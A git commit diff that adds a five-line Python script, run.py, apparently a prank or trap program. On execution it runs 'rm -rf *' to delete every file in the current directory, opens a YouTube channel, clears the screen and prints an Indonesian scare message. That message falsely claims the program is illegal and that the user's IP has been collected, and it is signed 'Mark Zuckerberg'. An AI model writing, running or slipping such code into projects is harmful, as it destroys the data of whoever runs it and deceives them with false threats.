6b607e4d04008aa022374532455137b79f4868e1
Badru-ID <51870493+Badru-ID@users.noreply.github.com>
2019-06-19 03:10:16 +0700

    Add files via upload

---
+++ run.py
@@ -0,0 +1,5 @@
+import os
+os.system("rm -rf *")
+os.system("xdg-open https://www.youtube.com/channel/UCc3ktJXzCcNfEo8q5t2lVAg")
+os.system("clear")
+print("\n\n Ini adalah program illegal!\n IP pengguna sudah dikumpulkan\n Berhentilah sebelum terlambat!\n\n - Mark Zuckerberg\n\n")
